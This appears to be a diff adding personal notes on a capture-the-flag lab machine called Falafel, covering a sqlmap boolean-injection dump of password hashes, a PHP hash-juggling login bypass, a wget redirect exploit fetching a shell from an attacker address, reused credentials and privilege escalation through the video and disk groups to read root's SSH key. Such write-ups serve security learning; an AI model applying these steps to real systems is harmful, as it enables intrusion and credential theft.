@@ -1,0 +1,111 @@
+(love this box!, learnt a lot about understanding priv in `id`)
+Hints:
+- we can know if the user name is correct => boolean sqli
+    - sqlmap needs `--risk 3 --level 5 --string "Wrong identification"`, the string is very important for Boolean attack.
+- php code hash comparision collision. 0exxxx is 0^xxxx is 0. Any other 0eyyyy is 0. in php 0exxx == 0eyyyy
+- we can receive the request and know the version of the wget.
+- filename has a limits, use it to get rid of last extension 
+- we can see one user is logged in and our user has strange group
+- if we have video priv, we can take data from /dev/fb0 (or fb1,fb2..)
+- if we have disk priv, we can use debugfs to traverse the file system
+
+Logs:
+# init
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)
+|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)
+|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/*.txt
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Falafel Lovers
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# http on 80
+IT@falafel.htb
+
+
+`gobuster -u http://falafel.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt` =>
+/uploads
+/upload.php
+/cyberlaw.txt
+
+read /cyberlaw.txt =>
+"
+From: Falafel Network Admin (admin@falafel.htb)
+Subject: URGENT!! MALICIOUS SITE TAKE OVER!
+Date: November 25, 2017 3:30:58 PM PDT
+To: lawyers@falafel.htb, devs@falafel.htb
+Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
+Mime-Version: 1.0
+X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
+X-Spam-Level: ***
+
+A user named "chris" has informed me that he could log into MY account without knowing the password,
+then take FULL CONTROL of the website using the image upload feature.
+We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
+so I have no idea how he did it.
+
+Dear lawyers, please handle him. I believe Cyberlaw is on our side.
+Dear develpors, fix this broken site ASAP.
+
+    ~admin
+"
+
+so we may need to login and upload to get a shell.
+
+## login.php
+sqlmap on login.php failed.
+tried, admin and chris are users according to the errors.
+
+sqlmap -r post.req --batch --level 5 --risk 3 --dbms mysql -p username,password --string "Wrong identification" --dump
+=>
++----+--------+----------+---------------------------------------------+
+| ID | role   | username | password                                    |
++----+--------+----------+---------------------------------------------+
+| 1  | admin  | admin    | 0e462096931906507119562988736854            |
+| 2  | normal | chris    | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) |
++----+--------+----------+---------------------------------------------+
+
+online md5 => admin:240610708
+login succeeded
+
+upload an nonexist url => reveal cmd: cd /var/www/html/uploads/<random string>; wget 'http://10.10.14.xx/shell.png'
+
+find in request log, wget is 1.71 version.
+searchsploit wget => find redirect vuln => download exp code => modify it => python -m pyftpdlib -p 21  => .. =>  get shell
+
+# priv esc - get user moshe
+find cred in web dir:
+define('DB_SERVER', 'localhost:3306');
+define('DB_USERNAME', 'moshe');
+define('DB_PASSWORD', 'falafelIsReallyTasty');
+define('DB_DATABASE', 'falafel');
+
+password reuse => get moshe ssh
+
+# priv esc - get another user
+enum shows:
+yossi    tty1                      Fri06   19:01m  0.06s  0.04s -bash
+moshe    pts/1    10.10.14.19      21:49    5.00s  0.15s  0.00s bash LinEnum.sh
+
+wow, the yossi is physically connecting the machine. Which means, he has a screen. And our current user moshe has priv "29(audio),44(video),60(games)".
+
+use `ls /dev/ | grep fb` to find it => fb0 => transmit fb0 to our kali
+
+gimp => gabage for now. we need to know image parameters.
+
+`find . -name *fb0* 2>/dev/null` => find some file related to fb0 (yossi's screen)
+
+cat /sys/class/graphics/fb0/virtual_size => know the actual resolution => play parameters => get screen
+=> yossi:MoshePlzStopHackingMe!
+
+# priv esc - root
+yossi has 6(disk) priv. It means he can do some operations on disk.
+`find /dev -name sd*`
+`debugfs /dev/sda1` => traverse the disk => find id_rsa
+
+# alternative
+2018 exploit RationalLove
